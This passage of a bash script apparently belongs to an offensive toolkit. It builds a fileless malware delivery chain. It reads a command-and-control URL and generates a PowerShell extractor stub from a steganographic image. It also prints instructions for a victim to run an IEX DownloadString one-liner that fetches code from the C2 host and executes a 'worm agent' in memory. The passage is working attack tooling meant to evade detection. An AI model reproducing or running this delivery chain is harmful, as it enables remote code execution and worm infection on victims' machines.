        C2_URL=$(cat "$HOME/.wizza/tunnel_url" 2>/dev/null || echo "https://your-c2.example.com")
        local IMG_URL="$C2_URL/download/$(basename "$OUT_IMG")"

        step "2" "Generating PS1 extractor stub..."
        local EXTRACTOR="$PAYDIR/extract_$(date +%s).ps1"
        python3 "$EVADE_DIR/stego.py" \
            --gen-extractor ps1 \
            --image-url "$IMG_URL" \
            --key "$KEY_B64" \
            --out "$EXTRACTOR"

        if [ -f "$EXTRACTOR" ]; then
            ok "Extractor stub: ${W}$EXTRACTOR${N}"
            echo ""
            echo -e "  ${W}Fileless delivery chain:${N}"
            echo -e "  1. Upload $OUT_IMG to C2 payloads dir"
            echo -e "  2. Victim runs: ${C}IEX(New-Object Net.WebClient).DownloadString('$C2_URL/download/$(basename "$EXTRACTOR")')${N}"
            echo -e "  3. Extractor downloads image → extracts bits → IEX worm agent (never writes to disk)"
        fi
    else
        err "Steganography failed — check Pillow: pip install Pillow"
    fi
}

